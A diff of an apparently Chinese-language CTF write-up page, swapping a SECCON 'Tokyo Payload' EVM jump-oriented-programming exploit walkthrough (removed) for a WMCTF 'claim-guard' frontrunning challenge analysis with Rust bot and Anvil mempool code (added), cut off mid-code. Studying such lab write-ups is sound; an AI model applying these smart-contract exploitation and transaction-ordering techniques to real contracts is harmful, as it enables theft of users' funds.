@@ -6,20 +6,20 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="2023 | SECCON | Misc">
+        <meta name="description" content="2024 | WMCTF | BlockChain">
       
       
         <meta name="author" content="YanhuiJessica">
       
       
-        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/tokyo_payload/">
+        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/claim_guard/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-8.3.3">
     
     
       
-        <title>Blockchain - Tokyo Payload - Chictf-Writeups</title>
+        <title>Blockchain - claim-guard - Chictf-Writeups</title>
       
     
     
@@ -113,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Blockchain - Tokyo Payload
+              Blockchain - claim-guard
             
           </span>
         </div>
@@ -2606,75 +2606,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          Tokyo Payload
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../tokyo_payload/" class="md-nav__link">
         Tokyo Payload
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    题目
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    解题思路
-  </a>
-  
-    <nav class="md-nav" aria-label="解题思路">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    参考资料
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -3129,11 +3065,75 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../claim_guard/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          claim-guard
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         claim-guard
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    题目
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    解题思路
+  </a>
+  
+    <nav class="md-nav" aria-label="解题思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    解题脚本
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -3768,21 +3768,21 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
+  <a href="#_3" class="md-nav__link">
+    解题脚本
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    Flag
   </a>
   
 </li>
         
       </ul>
     </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    参考资料
-  </a>
   
 </li>
       
@@ -3800,31 +3800,31 @@
   
   <div style="color: gray;">
     <small>
-      2023 | SECCON | Misc
+      2024 | WMCTF | BlockChain
     </small>
   </div>
   
 
   
                 
-  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/tokyo_payload.md" title="编辑此页" class="md-content__button md-icon">
+  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/claim_guard.md" title="编辑此页" class="md-content__button md-icon">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
   </a>
 
 
 
-  <h1>Tokyo Payload</h1>
+  <h1>claim-guard</h1>
 
 <div class="md-typeset">
     <div class="blogging-tags-grid">
 
-        <a href="#smart contract" class="blogging-tag"><code>#smart contract</code></a>
+        <a href="#mev" class="blogging-tag"><code>#mev</code></a>
 
-        <a href="#evm" class="blogging-tag"><code>#evm</code></a>
+        <a href="#frontrun" class="blogging-tag"><code>#frontrun</code></a>
 
-        <a href="#bytecode" class="blogging-tag"><code>#bytecode</code></a>
+        <a href="#rust" class="blogging-tag"><code>#rust</code></a>
 
-        <a href="#jump oriented programming" class="blogging-tag"><code>#jump oriented programming</code></a>
+        <a href="#transaction order" class="blogging-tag"><code>#transaction order</code></a>
 
     </div>
 
@@ -3852,171 +3852,205 @@
     }
 </style>
 <h2 id="_1">题目<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<p>What is Solidity?</p>
+<p>We got a cheater.</p>
 <blockquote>
-<p>nc tokyo-payload.seccon.games 31337</p>
+<p>nc claim-guard.wm-team.cn 1337</p>
 </blockquote>
-<details class="note">
-<summary>Setup.sol</summary>
-<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: Apache-2.0</span>
-<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="mf">0.8.21</span><span class="p">;</span>
-
-<span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="nx">TokyoPayload</span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">&quot;./TokyoPayload.sol&quot;</span><span class="p">;</span>
-
-<span class="nx">contract</span><span class="w"> </span><span class="nx">Setup</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">TokyoPayload</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">tokyoPayload</span><span class="p">;</span>
-
-<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">tokyoPayload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">TokyoPayload</span><span class="p">();</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">isSolved</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">tokyoPayload</span><span class="p">.</span><span class="nx">solved</span><span class="p">();</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-</details>
-<details class="note">
-<summary>TokyoPayload.sol</summary>
-<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: Apache-2.0</span>
-<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="mf">0.8.21</span><span class="p">;</span>
-
-<span class="nx">contract</span><span class="w"> </span><span class="nx">TokyoPayload</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">solved</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">gasLimit</span><span class="p">;</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">tokyoPayload</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">x</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">y</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mh">0x40</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">resetGasLimit</span><span class="p">();</span>
-<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">calldatacopy</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">calldatasize</span><span class="p">())</span>
-<span class="w">        </span><span class="p">}</span>
-<span class="w">        </span><span class="kd">function</span><span class="p">()[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">funcs</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">y</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">funcs</span><span class="p">[</span><span class="nx">z</span><span class="p">]();</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">load</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">pure</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">a</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">b</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">c</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">a</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">calldataload</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
-<span class="w">            </span><span class="nx">b</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">calldataload</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span><span class="w"> </span><span class="mh">0x20</span><span class="p">))</span>
-<span class="w">            </span><span class="nx">c</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">calldataload</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span><span class="w"> </span><span class="mh">0x40</span><span class="p">))</span>
-<span class="w">        </span><span class="p">}</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">createArray</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">length</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">pure</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">uint256</span><span class="p">[](</span><span class="nx">length</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">resetGasLimit</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">uint256</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">arr</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">gasLimit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">addr</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mh">0xCAFE</span><span class="p">));</span>
-<span class="w">        </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">addr</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">{</span><span class="nx">gas</span><span class="o">:</span><span class="w"> </span><span class="nx">gasLimit</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFFFF</span><span class="p">}(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-</details>
+<p><a href="../static/claim_guard.zip"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 20h14v-2H5m14-9h-4V3H9v6H5l7 7 7-7Z"/></svg></span> <code>claim_guard.zip</code></a></p>
 <h2 id="_2">解题思路<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
 <ul>
-<li>目标是让 <code>solved</code> 为 <code>true</code>，而 <code>TokyoPayload</code> 没有直接设置 <code>solved</code> 的语句，显然需要借助 <code>delegatecall</code></li>
-<li>地址检查限制了 <code>TokyoPayload.delegatecall()</code> 的调用，则只能通过 <code>tokyoPayload()</code> 跳转</li>
-<li>分配给 <code>delegatecall</code> 的 gas 取决于通过 <code>arr.length</code> 设置的 <code>gasLimit</code>，而 <code>arr</code> 是尚未初始化的内存数组，那么即读取 <code>MEM[0x60]</code> 中的值。<code>calldatacopy</code> 可以覆盖 <code>MEM[0x60]</code> 中的值，使得 <code>arr.length &gt; 0</code>，由此可确定 <span class="arithmatex">\(x\in[40_{16}, 80_{16})\)</span>（且由于每次调用 <code>tokyoPayload()</code> 都会重设 <code>gasLimit</code>，需要通过一次调用来完成多次跳转）</li>
+<li>合约 <code>Chall</code> 共有三个函数：<code>registerBlock()</code>、<code>proveWork()</code> 和 <code>claimLastWinner()</code>。题目要求 <code>player</code>，即给定的 EOA，成为 <code>lastWinner</code>。需要 <code>player</code> 在同一个块内依次调用三个函数并提供正确的工作证明</li>
+<li><code>blockNonce</code> 记录每个区块中 <code>proveWork()</code> 成功执行的次数。只有第一个成功执行 <code>proveWork()</code> 的账户能够调用 <code>claimLastWinner()</code> 成为 <code>lastWinner</code></li>
 <li>
-<p><code>DELEGATECALL</code> 所在块 <code>JUMPDEST</code> 的地址为 <code>0x1a3</code>，从栈顶到栈底调用栈应满足 <code>[目标地址addr, 下一跳转地址, ...]</code></p>
-<ul>
-<li>希望代理调用结束后直接结束本次交易，下一跳转地址可以选择 <code>0x93</code>
-<img alt="DELEGATECALL block" src="../img/tokyo_payload01.jpg" /></li>
-</ul>
+<p>题目环境中包含一个 bot，会在每个区块调用 <code>registerBlock()</code>，并监听 mempool。如果出现能够成功执行 <code>proveWork()</code> 的交易，bot 将使用更高的 gas price 试图抢跑对应交易</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 0x27d4563e</span>
+<span class="kd">let</span><span class="w"> </span><span class="n">sig</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="kt">u8</span><span class="p">;</span><span class="w"> </span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mh">0x27</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x56</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3e</span><span class="p">];</span>
+<span class="c1">// concat sig and pow</span>
+<span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Vec</span><span class="p">::</span><span class="n">with_capacity</span><span class="p">(</span><span class="mi">4</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
+<span class="n">data</span><span class="p">.</span><span class="n">extend_from_slice</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sig</span><span class="p">);</span>
+<span class="n">data</span><span class="p">.</span><span class="n">extend_from_slice</span><span class="p">(</span><span class="n">pow</span><span class="p">.</span><span class="n">as_slice</span><span class="p">());</span>
+<span class="kd">let</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Bytes</span><span class="p">::</span><span class="n">from</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+<span class="kd">let</span><span class="w"> </span><span class="n">bn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">finalized_block</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">number</span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span>
+<span class="kd">let</span><span class="w"> </span><span class="n">nonce</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="bp">self</span><span class="p">.</span><span class="n">nonce_map</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="o">&amp;</span><span class="n">bn</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+<span class="kd">let</span><span class="w"> </span><span class="n">effective_gas_price</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tx</span><span class="p">.</span><span class="n">gas_price</span><span class="p">.</span><span class="n">or</span><span class="p">(</span><span class="n">tx</span><span class="p">.</span><span class="n">max_fee_per_gas</span><span class="p">).</span><span class="n">unwrap_or_default</span><span class="p">();</span>
+<span class="kd">let</span><span class="w"> </span><span class="n">chain_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">provider</span><span class="p">.</span><span class="n">get_chain_id</span><span class="p">().</span><span class="k">await</span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span>
+<span class="kd">let</span><span class="w"> </span><span class="n">tx_receipt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransactionRequest</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">from</span><span class="p">:</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">sender_addr</span><span class="p">),</span>
+<span class="w">    </span><span class="n">to</span><span class="p">:</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">TxKind</span><span class="p">::</span><span class="n">Call</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">chall_addr</span><span class="p">)),</span>
+<span class="w">    </span><span class="n">gas_price</span><span class="p">:</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">effective_gas_price</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">),</span>
+<span class="w">    </span><span class="n">gas</span><span class="p">:</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="mi">100_0000</span><span class="p">),</span>
+<span class="w">    </span><span class="n">input</span><span class="p">:</span><span class="w"> </span><span class="nc">TransactionInput</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="n">bytes</span><span class="p">),</span>
+<span class="w">    </span><span class="n">chain_id</span><span class="p">:</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">chain_id</span><span class="p">),</span>
+<span class="w">    </span><span class="n">nonce</span><span class="p">:</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">nonce</span><span class="p">),</span>
+
+<span class="w">    </span><span class="o">..</span><span class="nb">Default</span><span class="p">::</span><span class="n">default</span><span class="p">()</span>
+<span class="p">};</span>
+</code></pre></div>
 </li>
 <li>
-<p>可通过 <code>calldataload</code> 将所需参数压入栈中，构造合适的调用栈。三个 <code>CALLDATALOAD</code> 所在块 <code>JUMPDEST</code> 的地址为 <code>0xd0</code>，从栈顶到栈底调用栈应满足 <code>[起始地址i, 下一跳转地址, ...]</code>。执行到 <code>0xdf</code> 时，栈中元素为 <code>[下一跳转地址, c, b, a, ...]</code><br>
-<img alt="CALLDATALOAD block" src="../img/tokyo_payload02.jpg" /></p>
+<p>与 <code>proveWork()</code> 不同，bot 发送的 <code>registerBlock()</code> 交易的 gas price 是固定的</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// register the block</span>
+<span class="kd">let</span><span class="w"> </span><span class="n">tx_receipt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransactionRequest</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">from</span><span class="p">:</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">sender_addr</span><span class="p">),</span>
+<span class="w">    </span><span class="n">to</span><span class="p">:</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">TxKind</span><span class="p">::</span><span class="n">Call</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">chall_addr</span><span class="p">)),</span>
+<span class="w">    </span><span class="n">gas_price</span><span class="p">:</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="mi">110000000000000000</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">100_0000</span><span class="p">),</span>
+<span class="w">    </span><span class="n">gas</span><span class="p">:</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="mi">100_0000</span><span class="p">),</span>
+<span class="w">    </span><span class="n">chain_id</span><span class="p">:</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">provider</span><span class="p">.</span><span class="n">get_chain_id</span><span class="p">().</span><span class="k">await</span><span class="p">.</span><span class="n">unwrap</span><span class="p">()),</span>
+<span class="w">    </span><span class="n">nonce</span><span class="p">:</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">nonce</span><span class="p">),</span>
+<span class="w">    </span><span class="n">input</span><span class="p">:</span><span class="w"> </span><span class="nc">hex</span><span class="p">::</span><span class="n">decode</span><span class="p">(</span><span class="s">&quot;0xccac0007&quot;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">().</span><span class="n">into</span><span class="p">(),</span>
+<span class="w">    </span><span class="o">..</span><span class="nb">Default</span><span class="p">::</span><span class="n">default</span><span class="p">()</span>
+<span class="p">};</span>
+</code></pre></div>
 </li>
 <li>
-<p>调用 <code>tokyoPayload()</code> 首次执行到函数跳转前，即 <code>0x18e JUMP</code>，对应源码 <code>funcs[z]()</code>，元素从栈顶到栈底依次为 <code>[0x18f, y, 0x60, y, x, ...]</code></p>
-</li>
-<li>在内存覆盖完成后，需要再次调用 <code>resetGasLimit()</code>，可以选择 <code>0x153 JUMPDEST</code>，此时 <code>y</code> 对应栈顶元素 <code>STACK[0]</code>，<code>x</code> 对应 <code>STACK[1]</code></li>
-<li>由于需要使用 <code>SSTORE</code> 且对应 cold slot，至少需要 22100 gas，<code>tokyoPayload()</code> 的函数签名为 <code>0x40c3</code> (16579)，可以设 <code>x</code> 为 <code>0x7B</code> (0x80 - 5)，这样 <code>delegatecall</code> 的 <code>gasLimit</code> 为 <code>0xc300</code></li>
-<li>另外，<code>0x17f</code> 对应的块可以对栈结构进行微调，可用于跳转 <code>0xd0</code> 前，改变栈顶参数 <code>i</code><br>
-<img alt="0x17f JUMPDEST" src="../img/tokyo_payload03.jpg" /></li>
-</ul>
-<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
-<ol>
-<li>调用 <code>tokyoPayload()</code>，覆盖内存，<code>funcs[z]()</code> 为 <code>0x17f</code></li>
-<li><code>0x17f</code> <code>MEM[0x20 * 0x18f + 0x20 + y] = 0xd0</code>，执行到 <code>0x18e JUMP</code> 时，栈中元素从栈顶到栈底依次为 <code>[0xd0, 0x60, y, ...]</code>，由此 <code>y</code> 为 <code>0x153</code></li>
-<li><code>0xd0</code> 构造栈，<code>b</code> 对应新的 <code>x</code>，<code>c</code> 对应新的 <code>y</code></li>
-<li><code>0x153</code> 重设 <code>gasLimit</code>，下一跳转地址 <code>0x1a3</code> 对应 <code>y</code>，<code>funcs[z]()</code> 为 <code>0xd0</code></li>
-<li><code>0xd0</code> 构造调用栈</li>
-<li><code>0x1a3</code> 代理调用</li>
-</ol>
-<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Logic</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">fallback</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">sstore</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span>
+<p>Anvil 默认按照 gas price 从高到低对交易进行排序<sup id="fnref:default"><a class="footnote-ref" href="#fn:default">1</a></sup>，同时需要保证每个账户的交易的 <code>nonce</code> 是有效的。在实现中采用对独立交易以 gas price 和 FIFO (ready ID) 优先排序的方式。其中，独立交易不依赖其它交易，即 <code>nonce</code> 有效可以立即执行。非独立交易将在前置交易执行后解锁并加入到独立交易集合中</p>
+<details class="note">
+<summary>TransactionsIterator</summary>
+<div class="highlight"><pre><span></span><code><span class="k">impl</span><span class="w"> </span><span class="n">TransactionsIterator</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="sd">/// Depending on number of satisfied requirements insert given ref</span>
+<span class="w">    </span><span class="sd">/// either to awaiting set or to best set.</span>
+<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">independent_or_awaiting</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">satisfied</span><span class="p">:</span><span class="w"> </span><span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">tx_ref</span><span class="p">:</span><span class="w"> </span><span class="nc">PoolTransactionRef</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">satisfied</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">tx_ref</span><span class="p">.</span><span class="n">transaction</span><span class="p">.</span><span class="n">requires</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// If we have satisfied all deps insert to best</span>
+<span class="w">            </span><span class="bp">self</span><span class="p">.</span><span class="n">independent</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">tx_ref</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// otherwise we&#39;re still awaiting for some deps</span>
+<span class="w">            </span><span class="bp">self</span><span class="p">.</span><span class="n">awaiting</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">tx_ref</span><span class="p">.</span><span class="n">transaction</span><span class="p">.</span><span class="n">hash</span><span class="p">(),</span><span class="w"> </span><span class="p">(</span><span class="n">satisfied</span><span class="p">,</span><span class="w"> </span><span class="n">tx_ref</span><span class="p">));</span>
 <span class="w">        </span><span class="p">}</span>
 <span class="w">    </span><span class="p">}</span>
 <span class="p">}</span>
 
-<span class="nx">contract</span><span class="w"> </span><span class="nx">TokyoPayloadTest</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="p">{</span>
+<span class="k">impl</span><span class="w"> </span><span class="nb">Iterator</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">TransactionsIterator</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">type</span><span class="w"> </span><span class="nc">Item</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Arc</span><span class="o">&lt;</span><span class="n">PoolTransaction</span><span class="o">&gt;</span><span class="p">;</span>
 
-<span class="w">    </span><span class="nx">TokyoPayload</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">tokyoPayload</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">logic</span><span class="p">;</span>
